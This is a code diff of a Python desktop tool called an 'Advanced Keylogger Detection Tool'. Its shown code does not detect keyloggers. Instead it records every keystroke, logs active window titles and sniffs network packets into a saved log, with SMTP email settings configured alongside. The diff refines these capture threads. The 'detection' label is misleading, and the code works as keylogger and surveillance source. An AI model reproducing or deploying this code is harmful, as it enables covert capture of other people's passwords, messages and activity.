@@ -1,9 +1,7 @@
 import os
-import platform
 import threading
 import time
 import numpy as np
-import pandas as pd
 import pygetwindow as gw
 import scapy.all as scapy
 import requests
@@ -15,16 +13,18 @@ from datetime import datetime
 import tkinter as tk
 from tkinter import messagebox, filedialog
 
+# Global variables
 data = []
-label = []
 monitoring_threads = []
 monitoring_active = False
-API_KEY = 'YOUR_VIRUSTOTAL_API_KEY'
+stop_event = threading.Event()
+
+API_KEY = 'your virustotal api key'
 SMTP_SERVER = 'smtp.gmail.com'
 SMTP_PORT = 587
 EMAIL_USERNAME = 'your_email@gmail.com'
 EMAIL_PASSWORD = 'your_password'
-EMAIL_RECIPIENTS = ['recipient1@gmail.com', 'recipient2@gmail.com', 'recipient3@gmail.com', 'recipient4@gmail.com']
+EMAIL_RECIPIENTS = ['recipient1@gmail.com', 'recipient2@gmail.com']
 
 
 def train_ai_model():
@@ -51,67 +51,89 @@ def send_email(subject, body):
     except Exception as e:
         print(f"[EMAIL ERROR] {e}")
 
+
 def monitor_windows():
-    while monitoring_active:
+    while not stop_event.is_set():
         active_window = gw.getActiveWindow()
         if active_window:
-            print(f"[WINDOW] Active Window: {active_window.title}")
+            title = active_window.title
+            print(f"[WINDOW] Active Window: {title}")
+            data.append(f"[WINDOW] {title}")
         time.sleep(2)
 
 
-def on_press(key):
-    try:
-        key_data = str(key.char)
-    except AttributeError:
-        key_data = str(key)
-    print(f"[KEYSTROKE] {key_data}")
-    data.append(key_data)
-
 def start_keylogger():
-    with keyboard.Listener(on_press=on_press) as listener:
+    def on_press(key):
+        try:
+            key_data = str(key.char)
+        except AttributeError:
+            key_data = str(key)
+        print(f"[KEYSTROKE] {key_data}")
+        data.append(f"[KEYSTROKE] {key_data}")
+
+    def on_release(key):
+        if stop_event.is_set():
+            return False
+
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
         listener.join()
 
 
 def monitor_network():
     def process_packet(packet):
         if packet.haslayer(scapy.IP):
-            print(f"[NETWORK] {packet[scapy.IP].src} -> {packet[scapy.IP].dst}")
-    scapy.sniff(prn=process_packet, store=False)
+            log = f"[NETWORK] {packet[scapy.IP].src} -> {packet[scapy.IP].dst}"
+            print(log)
+            data.append(log)
 
+    while not stop_event.is_set():
+        scapy.sniff(prn=process_packet, store=False, timeout=1)
 
 
 def create_gui():
     def start_detection():
-        global monitoring_active
+        global monitoring_active, stop_event
+
         if not monitoring_active:
             print("Starting Advanced Keylogger Detection Tool...")
-            model = train_ai_model()
+            train_ai_model()
             monitoring_active = True
-            monitoring_threads.append(threading.Thread(target=monitor_windows))
-            monitoring_threads.append(threading.Thread(target=start_keylogger))
-            monitoring_threads.append(threading.Thread(target=monitor_network))
+            stop_event.clear()
+            monitoring_threads.clear()
+
+            monitoring_threads.append(threading.Thread(target=monitor_windows, daemon=True))
+            monitoring_threads.append(threading.Thread(target=start_keylogger, daemon=True))
+            monitoring_threads.append(threading.Thread(target=monitor_network, daemon=True))
+
             for thread in monitoring_threads:
                 thread.start()
+
             messagebox.showinfo("Info", "Monitoring Started")
         else:
             messagebox.showwarning("Warning", "Monitoring is already running!")
 
     def stop_detection():
-        global monitoring_active
+        global monitoring_active, stop_event
+
         if monitoring_active:
-            monitoring_active = False
             print("Stopping monitoring...")
+            stop_event.set()
+            monitoring_active = False
+            for thread in monitoring_threads:
+                thread.join(timeout=3)
+
             save_prompt = messagebox.askyesno("Save Log", "Do you want to save the log before exiting?")
             if save_prompt:
                 save_log()
-            root.quit()
+
+            messagebox.showinfo("Info", "Monitoring Stopped")
         else:
             messagebox.showwarning("Warning", "No monitoring is active!")
 
     def save_log():
         log_filename = f"monitoring_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
         with open(log_filename, 'w') as log_file:
-            log_file.write("=== Monitoring Log ===\n")
+            log_file.write("\t\t=== Monitoring Log ===\n")
             log_file.write(f"Generated on: {datetime.now()}\n\n")
             for entry in data:
                 log_file.write(f"{entry}\n")
@@ -127,34 +149,27 @@ def create_gui():
             files = {'file': (os.path.basename(file_path), file)}
             headers = {'x-apikey': API_KEY}
             response = requests.post('https://www.virustotal.com/api/v3/files', files=files, headers=headers)
+
             if response.status_code == 200:
                 analysis_url = response.json()['data']['links']['self']
                 print(f"File uploaded successfully. Check results here: {analysis_url}")
-                messagebox.showinfo("File Uploaded", f"File uploaded successfully. Check results here: {analysis_url}")
+                messagebox.showinfo("File Uploaded", f"Check results: {analysis_url}")
             else:
                 print("Error uploading file to VirusTotal")
-                messagebox.showerror("Error", "Error uploading file to VirusTotal")
+                messagebox.showerror("Error", "VirusTotal upload failed")
 
-    global root
     root = tk.Tk()
     root.title("Advanced Keylogger Detection Tool")
     root.geometry("400x400")
-    label = tk.Label(root, text="Click the buttons to manage monitoring")
-    label.pack(pady=20)
+    tk.Label(root, text="Click the buttons to manage monitoring").pack(pady=20)
 
-    start_button = tk.Button(root, text="Start Monitoring", command=start_detection)
-    start_button.pack(pady=10)
-
-    stop_button = tk.Button(root, text="Stop Monitoring", command=stop_detection)
-    stop_button.pack(pady=10)
-
-    save_button = tk.Button(root, text="Save Log", command=save_log)
-    save_button.pack(pady=10)
-
-    scan_button = tk.Button(root, text="Scan File with VirusTotal", command=scan_file_with_virustotal)
-    scan_button.pack(pady=10)
+    tk.Button(root, text="Start Monitoring", command=start_detection).pack(pady=10)
+    tk.Button(root, text="Stop Monitoring", command=stop_detection).pack(pady=10)
+    tk.Button(root, text="Save Log", command=save_log).pack(pady=10)
+    tk.Button(root, text="Scan File with VirusTotal", command=scan_file_with_virustotal).pack(pady=10)
 
     root.mainloop()
+
 
 if __name__ == "__main__":
     create_gui()
